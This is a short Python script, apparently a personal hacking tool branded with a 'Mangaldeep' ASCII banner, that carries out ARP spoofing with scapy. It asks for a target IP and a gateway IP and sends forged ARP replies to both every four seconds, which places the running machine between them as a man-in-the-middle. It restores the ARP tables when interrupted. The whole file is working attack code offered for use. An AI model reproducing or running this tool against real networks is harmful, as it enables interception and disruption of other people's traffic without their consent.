import scapy.all as scapy
import time

def create_banner(text):
    banner = f"""
                                   _     _
 _ __ ___   __ _ _ __   __ _  __ _| | __| | ___  ___ _ __  
| '_ ` _ \ / _` | '_ \ / _` |/ _` | |/ _` |/ _ \/ _ \ '_ \ 
| | | | | | (_| | | | | (_| | (_| | | (_| |  __/  __/ |_) |
|_| |_| |_|\__,_|_| |_|\__, |\__,_|_|\__,_|\___|\___| .__/ 
                       |___/                        |_|   
                                            
    {text}
    """
    print(banner)
if __name__ == "__main__":
    banner_text = "Mangaldeep"
    create_banner(banner_text)



def spoof(target, router):
    target_mac = scapy.getmacbyip(target)
    packet_target = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=router)
    scapy.send(packet_target, verbose=False)

def restore(target, router):
    target_mac = scapy.getmacbyip(target)
    gateway_mac = scapy.getmacbyip(router)
    packet_target = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=router, hwsrc=gateway_mac)
    scapy.send(packet_target, verbose=False)

interval = 4
target = input("Enter target IP address: ")
router = input("Enter gateway IP address: ")

try:
    while True:
        spoof(target, router)
        spoof(router, target)
        time.sleep(interval)
except KeyboardInterrupt:
    restore(target, router)
    restore(router, target)

